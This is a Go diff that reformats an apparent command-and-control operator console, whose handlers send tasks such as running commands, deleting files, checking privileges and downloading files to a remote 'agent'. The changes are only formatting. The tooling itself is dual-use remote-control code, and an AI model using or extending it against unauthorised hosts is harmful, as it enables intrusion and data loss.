@@ -9,21 +9,20 @@ import (
 )
 
 var CmdCodeMap = map[string]int{
-	"proc":  	 0,
-	"cmd": 	 1,
-	"cat": 	 2,
-	"ls":  	 3,
-	"rm":  	 4,
-	"mv":  	 5,
-	"pwd": 	 6,
-	"cd":  	 7,
-	"cp": 	 8,
-	"rmdir": 9,
+	"proc":      0,
+	"cmd":       1,
+	"cat":       2,
+	"ls":        3,
+	"rm":        4,
+	"mv":        5,
+	"pwd":       6,
+	"cd":        7,
+	"cp":        8,
+	"rmdir":     9,
 	"get-privs": 10,
-	"mkdir": 11,
-	"download": 12,
+	"mkdir":     11,
+	"download":  12,
 }
-
 
 func (c *CLI) requireAgent() bool {
 	if c.ClientInUse == "" {
@@ -56,7 +55,6 @@ func (c *CLI) sendTask(cmd string, param1 string, param2 string) bool {
 	return true
 }
 
-
 func (c *CLI) HandleDOWNLOAD(args []string) {
 	if !c.requireAgent() {
 		return
@@ -69,7 +67,7 @@ func (c *CLI) HandleDOWNLOAD(args []string) {
 
 }
 
-func(c *CLI) HandleRMDIR(args []string) {
+func (c *CLI) HandleRMDIR(args []string) {
 	if !c.requireAgent() {
 		return
 	}
@@ -105,15 +103,15 @@ func (c *CLI) HandleMKDIR(args []string) {
 	c.sendTask("mkdir", strings.Join(args, " "), "")
 }
 
-func(c *CLI) HandleGETPRIVS(args []string) {
+func (c *CLI) HandleGETPRIVS(args []string) {
 	if !c.requireAgent() {
 		return
 	}
 
-	c.sendTask("get-privs", " ", "")
+	c.sendTask("get-privs", "", "")
 }
 
-func(c *CLI) HandleRM(args []string) {
+func (c *CLI) HandleRM(args []string) {
 	if !c.requireAgent() {
 		return
 	}
@@ -124,8 +122,7 @@ func(c *CLI) HandleRM(args []string) {
 	c.sendTask("rm", strings.Join(args, " "), "")
 }
 
-
-func(c *CLI) HandleCAT(args []string) {
+func (c *CLI) HandleCAT(args []string) {
 	if !c.requireAgent() {
 		return
 	}
@@ -175,7 +172,6 @@ func (c *CLI) HandleCP(args []string) {
 
 	c.sendTask("cp", args[0], args[1])
 }
-
 
 func (c *CLI) HandleMV(args []string) {
 	if !c.requireAgent() {
